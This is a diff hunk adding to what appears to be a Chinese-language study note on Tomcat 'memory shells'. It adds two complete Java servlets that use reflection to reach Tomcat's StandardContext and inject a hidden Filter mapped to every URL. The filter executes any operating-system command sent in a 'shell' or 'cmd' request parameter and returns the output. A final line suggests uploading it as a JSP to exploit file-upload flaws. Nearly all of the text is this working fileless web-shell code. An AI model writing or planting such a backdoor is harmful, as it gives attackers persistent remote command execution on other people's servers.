@@ -234,3 +234,234 @@ public class evilFilter implements Filter {
 
 ![](attachments/Pasted%20image%2020230313145258.png)
 
+
+
+```java
+package org.example.demo;  
+  
+import org.apache.catalina.Context;  
+import org.apache.catalina.core.ApplicationContext;  
+import org.apache.catalina.core.ApplicationFilterConfig;  
+import org.apache.catalina.core.StandardContext;  
+import org.apache.tomcat.util.descriptor.web.FilterDef;  
+import org.apache.tomcat.util.descriptor.web.FilterMap;  
+  
+  
+import javax.servlet.*;  
+import javax.servlet.annotation.WebServlet;  
+import javax.servlet.http.*;  
+  
+import java.io.IOException;  
+import java.io.InputStream;  
+import java.lang.reflect.Constructor;  
+import java.lang.reflect.Field;  
+import java.util.Map;  
+import java.util.Scanner;  
+  
+@WebServlet(name = "wuwumonster", value = "/wuwumonster")  
+public class ServletFilterShell extends HttpServlet {  
+  
+    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {  
+        this.doPost(request, response);  
+    }  
+  
+    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {  
+        Field Configs;  
+        Map filterConfigs;  
+        try {  
+            //获取上下文  
+            ServletContext servletContext = request.getServletContext();  
+  
+            //反射获取standard context  
+  
+  
+            Field appctx = servletContext.getClass().getDeclaredField("context");  
+            appctx.setAccessible(true);  
+            ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);  
+  
+            Field stdctx = applicationContext.getClass().getDeclaredField("context");  
+            stdctx.setAccessible(true);  
+            StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);  
+            //设置恶意的filter类  
+            String Filtername = "Filter_Shell";  
+            Configs = standardContext.getClass().getDeclaredField("filterConfigs");  
+            Configs.setAccessible(true);  
+            filterConfigs = (Map) Configs.get(standardContext);  
+  
+            if (filterConfigs.get(Filtername) == null) {  
+                Filter filter = new Filter() {  
+                    @Override  
+                    public void init(FilterConfig config) throws ServletException {  
+                    }  
+  
+                    @Override  
+                    public void destroy() {  
+                    }  
+  
+                    @Override  
+                    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException {  
+                        if(request.getParameter("shell")!=null) {  
+                            java.io.InputStream in  = Runtime.getRuntime().exec(request.getParameter("shell")).getInputStream();  
+                            byte[] b = new byte[2048];  
+                            response.getWriter().println("<pre>");  
+                            while ((in.read(b))!=-1) {  
+                                response.getWriter().println(new String(b));  
+                            }  
+                            response.getWriter().println("</pre>");  
+                        }  
+                        chain.doFilter(request, response);  
+                    }  
+                };  
+                //通过反射获取filterdef  
+                Class<?> Filterdef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");  
+                Constructor declaredConstructors = Filterdef.getDeclaredConstructor();  
+                FilterDef obj = (FilterDef) declaredConstructors.newInstance();  
+                obj.setFilter(filter);  
+                obj.setFilterName(Filtername);  
+                obj.setFilterClass(filter.getClass().getName());  
+                standardContext.addFilterDef(obj);  
+  
+                //反射获取filtermap  
+                Class<?> Filtermap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");  
+                Constructor<?> mapConstructor = Filtermap.getDeclaredConstructor();  
+                org.apache.tomcat.util.descriptor.web.FilterMap obj2 = (FilterMap) mapConstructor.newInstance();  
+  
+                obj2.addURLPattern("/*");  
+                obj2.setFilterName(Filtername);  
+                obj2.setDispatcher(DispatcherType.REQUEST.name());  
+                standardContext.addFilterMapBefore(obj2);  
+  
+                //反射拿  filterconfig，并将其传入进行注册
+                Class<?> ApplicationFilterConfig = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");  
+                Constructor<?> configConstructor = ApplicationFilterConfig.getDeclaredConstructor(Context.class, FilterDef.class);  
+                configConstructor.setAccessible(true);  
+                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) configConstructor.newInstance(standardContext,obj);  
+                filterConfigs.put(Filtername, filterConfig);  
+                response.getWriter().write("SUCCESS");  
+            }  
+        } catch (Exception e) {  
+            e.printStackTrace();  
+        }  
+    }  
+}
+```
+
+![](attachments/Pasted%20image%2020230313200457.png)
+
+发现在回显这里其实我这样的写法可能会收到原页面的影响，最好的其实是下面这种,黑色很帅
+
+```java
+package org.example.demo;  
+  
+import org.apache.catalina.Context;  
+import org.apache.catalina.core.ApplicationContext;  
+import org.apache.catalina.core.ApplicationFilterConfig;  
+import org.apache.catalina.core.StandardContext;  
+import org.apache.tomcat.util.descriptor.web.FilterDef;  
+import org.apache.tomcat.util.descriptor.web.FilterMap;  
+  
+  
+import javax.servlet.*;  
+import javax.servlet.annotation.WebServlet;  
+import javax.servlet.http.*;  
+  
+import java.io.IOException;  
+import java.io.InputStream;  
+import java.lang.reflect.Constructor;  
+import java.lang.reflect.Field;  
+import java.util.Map;  
+import java.util.Scanner;  
+  
+@WebServlet(name = "wuwumonster", value = "/wuwumonster")  
+public class ServletFilterShell extends HttpServlet {  
+  
+    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {  
+        this.doPost(request, response);  
+    }  
+  
+    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {  
+        Field Configs;  
+        Map filterConfigs;  
+        try {  
+            //获取上下文  
+            ServletContext servletContext = request.getServletContext();  
+  
+            //反射获取standard context  
+  
+  
+            Field appctx = servletContext.getClass().getDeclaredField("context");  
+            appctx.setAccessible(true);  
+            ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);  
+  
+            Field stdctx = applicationContext.getClass().getDeclaredField("context");  
+            stdctx.setAccessible(true);  
+            StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);  
+            //设置恶意的filter类  
+            String Filtername = "Filter_Shell";  
+            Configs = standardContext.getClass().getDeclaredField("filterConfigs");  
+            Configs.setAccessible(true);  
+            filterConfigs = (Map) Configs.get(standardContext);  
+  
+            if (filterConfigs.get(Filtername) == null) {  
+                Filter filter = new Filter() {  
+                    @Override  
+                    public void init(FilterConfig config) throws ServletException {  
+                    }  
+  
+                    @Override  
+                    public void destroy() {  
+                    }  
+  
+                    @Override  
+                    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {  
+                        HttpServletRequest req = (HttpServletRequest) servletRequest;  
+                        if (req.getParameter("cmd") != null){  
+                            System.out.println("do some bad bad");  
+  
+                            InputStream in = Runtime.getRuntime().exec(req.getParameter("cmd")).getInputStream();  
+//  
+                            Scanner s = new Scanner(in).useDelimiter("\\A");  
+                            String output = s.hasNext() ? s.next() : "";  
+                            servletResponse.getWriter().write(output);  
+  
+                            return; }  
+                        filterChain.doFilter(servletRequest,servletResponse);  
+                    }  
+                };  
+                //通过反射获取filterdef  
+                Class<?> Filterdef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");  
+                Constructor declaredConstructors = Filterdef.getDeclaredConstructor();  
+                FilterDef obj = (FilterDef) declaredConstructors.newInstance();  
+                obj.setFilter(filter);  
+                obj.setFilterName(Filtername);  
+                obj.setFilterClass(filter.getClass().getName());  
+                standardContext.addFilterDef(obj);  
+  
+                //反射获取filtermap  
+                Class<?> Filtermap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");  
+                Constructor<?> mapConstructor = Filtermap.getDeclaredConstructor();  
+                org.apache.tomcat.util.descriptor.web.FilterMap obj2 = (FilterMap) mapConstructor.newInstance();  
+  
+                obj2.addURLPattern("/*");  
+                obj2.setFilterName(Filtername);  
+                obj2.setDispatcher(DispatcherType.REQUEST.name());  
+                standardContext.addFilterMapBefore(obj2);  
+  
+                //反射拿  
+                Class<?> ApplicationFilterConfig = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");  
+                Constructor<?> configConstructor = ApplicationFilterConfig.getDeclaredConstructor(Context.class, FilterDef.class);  
+                configConstructor.setAccessible(true);  
+                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) configConstructor.newInstance(standardContext,obj);  
+                filterConfigs.put(Filtername, filterConfig);  
+                response.getWriter().write("SUCCESS");  
+            }  
+        } catch (Exception e) {  
+            e.printStackTrace();  
+        }  
+    }  
+}
+```
+
+![](attachments/Pasted%20image%2020230313200620.png)
+
+如果是在上传文件中的利用，则上传jsp形式的文件
